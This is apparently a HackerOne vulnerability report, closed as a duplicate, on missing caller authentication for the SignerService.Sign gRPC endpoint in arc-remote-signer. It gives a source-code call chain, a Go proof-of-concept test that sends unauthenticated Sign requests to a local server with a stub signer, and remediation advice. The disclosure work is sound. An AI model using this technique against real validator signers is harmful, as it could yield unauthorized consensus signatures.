# ✅ SUBMITTED — closed as Duplicate (2026-08-31)

Submitted to HackerOne as report #3981927. Closed same day as a
duplicate of report #3720384 — another researcher reported the exact
same root cause first (missing authentication on `SignerService.Sign`).
Circle's triage description matched our analysis point for point (same
interceptor chain, same default config, same impact), confirming the
finding itself was correct — this was a timing loss, not a wrong
finding. No bounty for duplicates per program rules. No further action
needed on this one; kept here as a record.


## Title
Unauthenticated `SignerService.Sign` allows network-reachable callers to invoke a privileged validator signing operation

## Program / Platform
Circle BBP via HackerOne — https://hackerone.com/circle-bbp

## Category
Access Control — Missing Authentication for Critical Function (CWE-306)

## Affected asset
Repository: `circlefin/arc-remote-signer`

Relevant files:
- `internal/app/service/signer/signer.go`
- `internal/app/public/public.go`
- `internal/common/grpc/server/server.go`
- `internal/common/grpc/server/option.go`
- `proto/arc/signer/v1/signer.proto`
- `configs/app.yaml`

Commit: `a9e9fdb48c1e96a6c3fb875aba3d341e6a8af1a6`

## Summary
`arc-remote-signer` exposes the validator's `SignerService.Sign` RPC without an application-level authentication or authorization check.

The RPC accepts a `bytes message` field and, in `internal/app/service/signer/signer.go`, only rejects a nil request or an empty message. The supplied bytes are then forwarded unchanged to the enclave signing provider.

The gRPC server is constructed without an authentication interceptor. When TLS is enabled, `WithTLS()` configures server-side TLS only; it does not configure client-certificate verification or any other authenticated caller identity. The published default configuration also ships with TLS disabled, bound to `0.0.0.0:10340`.

I reproduced the missing authentication boundary using the repository's real `public.New()` server-construction path, without modifying the production server implementation. Two separate `SignerService.Sign` calls containing different attacker-controlled messages were accepted with no authentication or authorization metadata and returned gRPC status `OK`.

**Important limitation:** the PoC does not access a production validator, private key, KMS, or Nitro Enclave. It uses a local stub solely to demonstrate that the unmodified production gRPC server construction accepts an unauthenticated `Sign()` request. Separately, source-code analysis confirms that the real `Service.Sign` implementation forwards the same caller-controlled bytes to the production signing provider (see Evidence).

Any principal that obtains network reachability to the signer service can therefore invoke a critical signing operation without proving it is the legitimate validator process.

## Confirmed call chain
1. `proto/arc/signer/v1/signer.proto:10-13` (`service SignerService`) and `:20-22` (`message SignRequest`) — `SignRequest` contains only the message payload and does not itself carry an application credential. This is supporting evidence, not proof by itself: authentication could still have been implemented at the transport/interceptor layer — but as points 3-5 below show, no such mechanism is present in the server construction.
2. `internal/app/service/signer/signer.go:205-238` (`Service.Sign`) — the handler. The only validation is `req != nil` (line 207) and `len(req.Message) != 0` (line 210). The RPC itself does not enforce a signing domain or typed consensus-message structure; the supplied bytes are forwarded unchanged to `s.enclavePvd.SignMessage(...)` at line 220. This is the most important piece of evidence in this report: the missing authentication sits directly in front of a privileged cryptographic operation, not a low-impact informational RPC. Demonstrated in `print1-signer.png`.
3. `internal/app/public/public.go:40-76` (`New`) — the production server registers `SignerService` at line 57 (`pb.RegisterSignerServiceServer`), but no authentication middleware is installed around it. Demonstrated in `print2-public.png`.
4. `internal/common/grpc/server/server.go:34-49` (`NewServer`) — the real interceptor chain, lines 36-39, is Recovery, RequestID, Metrics, Logging. These provide operational functionality but do not authenticate or authorize the caller. Demonstrated in `print3-server.png`.
5. `internal/common/grpc/server/option.go:86-99` (`WithTLS`) — configures server-certificate authentication only (`credentials.NewServerTLSFromFile`, line 92); no client CA / client certificate verification is configured anywhere in the function. Demonstrated in `print4-option.png`.
6. `configs/app.yaml:3` (`host: 0.0.0.0`) and `:7-8` (`tls: enabled: false`) — the repository's published/default configuration sets an all-interface listener with TLS disabled; Viper-based config in this codebase can be overridden by environment variables per deployment, so this is evidence of the shipped default, not a claim about what any specific deployment overrides it to. Demonstrated in `print5-yaml.png`.

## Supporting evidence — validator-side client
`circlefin/arc-node` (the published Arc Chain validator client), commit `66ad2d5aa6d9b41e8f689812004be4c7233a9e16`, confirms this is the actual signing path the validator software calls, not an unused or test-only RPC: `crates/remote-signer/src/client.rs::sign_message_once` builds the request as `proto::SignRequest { message: message.to_vec() }` — the same no-envelope, no-domain-tag shape found on the server — and `RemoteSigningConfig::default()` uses the same insecure defaults (`http://0.0.0.0:10340`, `enable_tls: false`). Demonstrated in `print7-arcnode.png`. When TLS is enabled, the client configures `ClientTlsConfig::new().ca_certificate(...)` only — no client certificate — confirming from the caller's side too that TLS here never establishes an authenticated client identity (`print8-tls.png`).

## Prerequisites
No application-level credentials are required.

The attacker must have network reachability to the `SignerService` endpoint. Under the repository's published/default configuration, the service listens on `0.0.0.0:10340` with TLS disabled. Whether an external attacker can obtain this network reachability depends on the deployment's network topology and access controls.

Examples of a realistic network-level prerequisite include access from another compromised workload in the same permitted network, an SSRF primitive capable of reaching the endpoint, lateral movement, or an overly permissive network policy/security-group configuration.

## Steps to reproduce
1. The Arc Chain validator runs `arc-remote-signer` as a sidecar, exposing `SignerService` on the configured port (default `10340`, TLS disabled by default).
2. Any network caller (within the service's network reach) connects via gRPC with no credentials at all.
3. Calls `Sign(SignRequest{message: <arbitrary bytes>})`.
4. The server invokes the `Sign` handler with no authentication check rejecting it. In production, the handler forwards the bytes unchanged to the enclave signing provider (call-chain point 2); the PoC below substitutes a local stub, so it returns a placeholder value, not a real signature (see Impact).

## Actual vs. expected result
- **Actual:** a caller with network reachability can invoke `SignerService.Sign` without presenting any application-level authentication or authorization credentials. The request is accepted by the production server-construction path.
- **Expected:** only the legitimate validator process should be able to invoke the signing operation. Requests from unauthenticated or unauthorized callers should be rejected before reaching the signing handler.

## Evidence
```go
// internal/app/service/signer/signer.go:205-238 (Service.Sign) — the
// most important evidence in this report: the only validation applied
// to the message before it is forwarded for signing
func (s *Service) Sign(ctx context.Context, req *pb.SignRequest) (*pb.SignResponse, error) {
  if req == nil {
    return nil, status.Error(codes.InvalidArgument, errInvalidRequest)
  }
  if len(req.Message) == 0 {
    return nil, status.Error(codes.InvalidArgument, errEmptyMessage)
  }
  // ... no other validation of req.Message ...
  resp, err := s.enclavePvd.SignMessage(ctx, &pb.SignMessageRequest{
    Algorithm:            s.algorithm,
    EncryptedKeyMaterial: cached.encryptedKeyMaterial,
    Message:              req.Message, // raw, attacker-controlled bytes
  })
  // ...
}
```
```protobuf
// proto/arc/signer/v1/signer.proto:10-22 — no identity/token field anywhere
service SignerService {
  rpc PublicKey(PublicKeyRequest) returns (PublicKeyResponse) {}
  rpc Sign(SignRequest) returns (SignResponse) {}
}
message SignRequest {
  bytes message = 1;
}
```
```go
// internal/app/public/public.go:40-76 (New)
func New(cfg *grpcServer.Config, params CreateServerParams) (lifecycle.Runnable, error) {
  opts, err := grpcServer.WithTLS(cfg.TLS)
  // ...
  grpcSrv := grpcServer.NewServer(engineParams, opts...)
  reflection.Register(grpcSrv)
  pb.RegisterSignerServiceServer(grpcSrv, params.SignerSvc)
  // no auth interceptor anywhere
}
```
```go
// internal/common/grpc/server/server.go:34-49 (NewServer) — the
// complete interceptor chain; no authentication step anywhere in it
func NewServer(params RequiredEngineParams, opts ...grpc.ServerOption) *grpc.Server {
  unaryInterceptors := []grpc.UnaryServerInterceptor{
    interceptor.WithRecovery(),
    interceptor.WithRequestID(),
    interceptor.WithMetrics(params.APIStatsService),
    interceptor.WithLogging(),
  }
  unaryInterceptors = append(unaryInterceptors, params.UnaryInterceptors...)
  // ...
  return grpc.NewServer(opts...)
}
```
```go
// internal/common/grpc/server/option.go:86-99 (WithTLS)
func WithTLS(cfg *TLSConfig) ([]grpc.ServerOption, error) {
  if cfg != nil && cfg.Enabled {
    // ...
    creds, err := credentials.NewServerTLSFromFile(cfg.Cert, cfg.Key)
    // ONE-SIDED TLS only — no ClientCAs, no RequireAndVerifyClientCert
    return []grpc.ServerOption{grpc.Creds(creds)}, nil
  }
  return []grpc.ServerOption{}, nil
}
```
```yaml
# configs/app.yaml:1-8
tls:
  enabled: false  # "secures the malachite -> sidecar gRPC connection. Disabled by default"
host: 0.0.0.0
```
```rust
// circlefin/arc-node @ 66ad2d5a — crates/remote-signer/src/client.rs:230-231
// The real validator client's own doc-comment: "All data is
// transmitted as raw bytes." Confirms the server-side finding from the
// other end of the same connection.
async fn sign_message_once(...) -> Result<Vec<u8>, RemoteSigningError> {
  let request = Request::new(proto::SignRequest {
    message: message.to_vec(), // no envelope, no domain tag
  });
  // ...
  let signature = result?.into_inner().signature;
  // only a LENGTH check — not a cryptographic or content validation
  if signature.len() != ED25519_SIGNATURE_SIZE_BYTES /* 64 */ {
    return Err(RemoteSigningError::InvalidResponse(...));
  }
  Ok(signature)
}
```
```rust
// circlefin/arc-node @ 66ad2d5a — crates/remote-signer/src/client.rs:91
// RemoteSignerClient::new() — client-side TLS config (optional evidence,
// complements the server-side option.go finding from the other end of
// the same connection)
if config.enable_tls && let Some(cert_path) = &config.tls_cert_path {
  let cert = fs::read(cert_path).await?;
  let tls_config = ClientTlsConfig::new().ca_certificate(Certificate::from_pem(cert));
  // ^ verifies the SERVER's certificate only — no .identity(...) call,
  //   no client certificate presented to the server
  channel_builder = channel_builder.tls_config(tls_config)?;
}
```

## Executable proof of concept
**What the PoC proves:** an unauthenticated caller reaches the real production server construction and `SignerService.Sign` handler. **What the PoC does not prove:** that a real validator signature can be obtained, or that a consensus equivocation/slashing event can be triggered.

The PoC tests the authentication boundary of the production gRPC server without contacting any production validator, AWS KMS, Nitro Enclave, or real signing key.

I ran the PoC locally using Go 1.27, with protobuf code generated from the repository's own `.proto` definitions. The test uses the repository's unmodified `public.New()` function to construct the gRPC server. The only substituted component is the signing backend, which is replaced by a local stub so the test can safely determine whether an unauthenticated request reaches the `SignerService.Sign` handler — this avoids AWS KMS/Secrets Manager/Localstack entirely, which are irrelevant to what's being tested (the absence of an interceptor, not the signing logic itself).

I made two independent RPC calls with different attacker-controlled messages. Neither request contained authentication metadata, authorization metadata, or a client certificate. Both requests reached the production server construction path and returned gRPC status `OK`. The returned `STUB-SIGNATURE-*` values are intentionally fake and are **not** presented as cryptographic signatures — separately, the source-code evidence above confirms that the production implementation forwards the same `message` bytes unchanged to `enclavePvd.SignMessage(...)`. Demonstrated live in `print6-poc.png`.

To reproduce:

1. Clone `circlefin/arc-remote-signer` at commit `a9e9fdb48c1e96a6c3fb875aba3d341e6a8af1a6`.
2. Install the toolchain and generate protobuf code from the repository's own `.proto` definitions:
   ```
   go install github.com/bufbuild/buf/cmd/buf@v1.50.0
   go install google.golang.org/protobuf/cmd/protoc-gen-go@v1.36.6
   go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@v1.5.1
   cd proto && buf generate && cd ..
   ```
3. Save the file below as `internal/app/public/poc_unauth_test.go`. This file is not part of the repository — it is the PoC itself, and it is never committed anywhere; it only calls the repository's own unmodified `public.New()` function:
   ```go
   // Local, throwaway PoC — never committed to the real repository.
   // Demonstrates that public.New() (the real, unmodified production
   // server construction function) exposes SignerService.Sign to ANY
   // caller with zero credentials, zero metadata, and zero TLS. The
   // stand-in SignerSvc below is a stub ONLY to avoid requiring AWS
   // KMS/Secrets Manager/the Nitro Enclave; it is not evidence of
   // anything by itself. The thing being demonstrated is that the
   // unmodified public.New() has no interceptor/credential check in
   // front of that stub.
   package public

   import (
     "context"
     "fmt"
     "testing"
     "time"

     grpcServer "github.com/circlefin/arc-remote-signer/internal/common/grpc/server"
     "github.com/circlefin/arc-remote-signer/proto/pb"
     "google.golang.org/grpc"
     "google.golang.org/grpc/credentials/insecure"
     "google.golang.org/grpc/metadata"
   )

   // stubSignerServer stands in for the real signer.Service (which
   // requires AWS KMS/Secrets Manager or the Nitro Enclave). It is
   // intentionally dumb: it does not check who is calling, because in
   // the real service that check would need to happen in
   // public.New()'s interceptor chain — this test proves that chain
   // has no such check.
   type stubSignerServer struct {
     pb.UnimplementedSignerServiceServer
     callCount int
   }

   func (s *stubSignerServer) Sign(_ context.Context, req *pb.SignRequest) (*pb.SignResponse, error) {
     s.callCount++
     placeholder := fmt.Sprintf("STUB-SIGNATURE-#%d-NOT-A-REAL-CRYPTOGRAPHIC-SIGNATURE", s.callCount)
     return &pb.SignResponse{Signature: []byte(placeholder)}, nil
   }

   func TestUnauthenticatedSignIsAccepted(t *testing.T) {
     stub := &stubSignerServer{}

     runnable, err := New(&grpcServer.Config{
       Host: "127.0.0.1",
       Port: 0, // OS-assigned ephemeral port
       TLS:  nil,
     }, CreateServerParams{
       ServiceName: "arc-remote-signer-poc",
       SignerSvc:   stub,
     })
     if err != nil {
       t.Fatalf("public.New() (real production server construction) failed: %v", err)
     }

     if err := runnable.Run(); err != nil {
       t.Fatalf("failed to start real server: %v", err)
     }
     defer func() {
       ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
       defer cancel()
       _ = runnable.Shutdown(ctx)
     }()

     addr := runnable.(*grpcServer.RunnableImpl).Addr().String()

     conn, err := grpc.NewClient(addr, grpc.WithTransportCredentials(insecure.NewCredentials()))
     if err != nil {
       t.Fatalf("failed to create client: %v", err)
     }
     defer conn.Close()
     client := pb.NewSignerServiceClient(conn)

     fmt.Println()
     fmt.Println("=== Unauthenticated Sign RPC PoC ===")
     fmt.Println()
     fmt.Println("Server:   production public.New() (unmodified)")
     fmt.Printf("Endpoint: %s\n", addr)

     messages := []string{
       "attacker-controlled-message-call-1-13ee02f9",
       "attacker-controlled-message-call-2-9f6cb1a4",
     }

     for i, msg := range messages {
       ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)

       // Prove there is no pre-authenticated state carried over: build
       // a brand-new, completely bare context for every single call.
       if md, ok := metadata.FromOutgoingContext(ctx); ok {
         t.Fatalf("expected no outgoing metadata, got: %v", md)
       }

       fmt.Printf("\n--- Call #%d ---\n", i+1)
       fmt.Println("Authentication metadata: NONE")
       fmt.Println("Authorization metadata:  NONE")
       fmt.Println("Client certificate:      NONE")
       fmt.Printf("\nMessage:\n  %s\n", msg)
       fmt.Println("\nRPC:")
       fmt.Println("  /arc.signer.v1.SignerService/Sign")

       resp, err := client.Sign(ctx, &pb.SignRequest{Message: []byte(msg)})
       cancel()
       if err != nil {
         t.Fatalf("Sign() call #%d was rejected (expected it to be ACCEPTED with no auth): %v", i+1, err)
       }

       fmt.Println("\nResult:")
       fmt.Println("  REQUEST ACCEPTED")
       fmt.Println("\ngRPC status:")
       fmt.Println("  OK")
       fmt.Println("\nSigning backend:")
       fmt.Println("  LOCAL STUB (not production KMS/Nitro Enclave)")
       fmt.Printf("  response = %q\n", string(resp.GetSignature()))
     }

     if stub.callCount != len(messages) {
       t.Fatalf("expected %d calls to reach the real Sign() handler, got %d", len(messages), stub.callCount)
     }

     fmt.Println()
     fmt.Println("=== FINDING REPRODUCED ===")
     fmt.Println("The request reached the production server construction path")
     fmt.Println("(public.New(), no reimplementation) without authentication, twice,")
     fmt.Println("with two different attacker-chosen messages and no metadata.")
   }
   ```
4. Run:
   ```
   go test ./internal/app/public/... -run TestUnauthenticatedSignIsAccepted -v -count=1
   ```

Real output (literal, 2026-08-31, run directly by me on my own machine — two independent calls with different attacker-chosen messages, to rule out any pre-authenticated state carried over from a first call; the test itself asserts the outgoing context carries no metadata before each call):
```
=== RUN   TestUnauthenticatedSignIsAccepted

=== Unauthenticated Sign RPC PoC ===

Server:   production public.New() (unmodified)
Endpoint: 127.0.0.1:50313

--- Call #1 ---
Authentication metadata: NONE
Authorization metadata:  NONE
Client certificate:      NONE

Message:
  attacker-controlled-message-call-1-13ee02f9

RPC:
  /arc.signer.v1.SignerService/Sign
2026/08/31 02:24:06 gRPC server listening on 127.0.0.1:50313
[gRPC middleware JSON access-log line omitted here for readability —
"status":"OK" confirmed, full raw line visible in the attached screenshot]

Result:
  REQUEST ACCEPTED

gRPC status:
  OK

Signing backend:
  LOCAL STUB (not production KMS/Nitro Enclave)
  response = "STUB-SIGNATURE-#1-NOT-A-REAL-CRYPTOGRAPHIC-SIGNATURE"

--- Call #2 ---
Authentication metadata: NONE
Authorization metadata:  NONE
Client certificate:      NONE

Message:
  attacker-controlled-message-call-2-9f6cb1a4

RPC:
  /arc.signer.v1.SignerService/Sign
[gRPC middleware JSON access-log line omitted here for readability —
"status":"OK" confirmed, full raw line visible in the attached screenshot]

Result:
  REQUEST ACCEPTED

gRPC status:
  OK

Signing backend:
  LOCAL STUB (not production KMS/Nitro Enclave)
  response = "STUB-SIGNATURE-#2-NOT-A-REAL-CRYPTOGRAPHIC-SIGNATURE"

=== FINDING REPRODUCED ===
The request reached the production server construction path
(public.New(), no reimplementation) without authentication, twice,
with two different attacker-chosen messages and no metadata.
2026/08/31 02:24:06 initiating graceful shutdown of gRPC server at 127.0.0.1:50313
2026/08/31 02:24:06 gRPC server gracefully stopped
--- PASS: TestUnauthenticatedSignIsAccepted (0.03s)
PASS
ok      github.com/circlefin/arc-remote-signer/internal/app/public      1.494s
```

The server's own real middleware request log confirms `"status":"OK"` — the unauthenticated call was processed as a legitimate request. No real network, no real key/enclave, ephemeral local server, shut down at the end of the test (minimal-impact principle).

## Impact
The confirmed impact is **unauthorized access to a privileged validator signing operation**.

Any principal that obtains network reachability to the `SignerService` endpoint can invoke `SignerService.Sign` without presenting an API credential, authentication token, client certificate, or other application-level identity.

The attacker controls the `message` bytes supplied to the RPC. The production `Service.Sign` implementation performs only basic request validation and then forwards the supplied bytes unchanged to `enclavePvd.SignMessage(...)`.

The executable PoC demonstrates this authentication failure against the repository's unmodified production `public.New()` server-construction path. Two independent requests containing different attacker-controlled messages were accepted without authentication or authorization metadata and returned gRPC status `OK`.

The PoC intentionally uses a local stub signing backend. Therefore, it does **not** claim that a real validator signature, private key, KMS operation, or Nitro Enclave signing operation was obtained. The production source-code path independently establishes that, in a real deployment, accepted requests are forwarded to the enclave signing provider.

### Security boundary bypass
The intended architecture uses the remote signer to isolate the validator's private signing key behind a privileged signing interface. Network-level controls such as AWS VPC security groups establish *where* the service can be reached, but do not establish *which* workload is authorized to invoke `SignerService.Sign`. The current request path is effectively:

```text
Network-reachable principal
        |
        v
No caller authentication / authorization
        |
        v
SignerService.Sign
        |
        v
Attacker-controlled message bytes
        |
        v
Signing provider / validator signing key
```

The Nitro Enclave protects the private key from direct extraction, but the absence of caller authentication means that compromise of another workload with network access to the signer can potentially provide access to the signing capability without compromising the enclave itself. A realistic attack path could involve a compromised workload, SSRF, lateral movement, or an overly permissive network policy that provides connectivity to the signer endpoint.

### Potential validator-consensus impact
If an attacker can construct bytes that the Arc consensus layer accepts as a valid validator-signing request, the unauthorized signing capability could potentially affect validator participation in consensus, including conflicting or unauthorized signatures. The exact protocol-level consequence depends on how the Arc consensus layer constructs, domain-separates, and validates messages outside `arc-remote-signer`.

The raw-byte signing interface may also warrant protocol-level review because the RPC does not itself enforce a typed signing domain. However, this report does not rely on that observation to establish the vulnerability or claim a consensus-level exploit.

This report does **not** claim that a consensus equivocation, double-signing event, slashing event, or broader consensus failure was reproduced.

The vulnerability established independently of those downstream conditions is that **network reachability is currently sufficient to invoke a privileged validator signing RPC without authenticating the caller**.

## Suggested remediation
The signing RPC should have an explicit authentication and authorization boundary so that only the intended validator process can invoke the signing operation. A suitable implementation would be mutual TLS with client-certificate verification — configuring a trusted client CA and requiring verified client certificates in `internal/common/grpc/server/option.go` (`WithTLS`) and `configs/app.yaml`. Alternatively, another strong caller-authentication mechanism appropriate for the deployment would work equally well. The important property is that network reachability alone must not be sufficient to invoke `SignerService.Sign`.
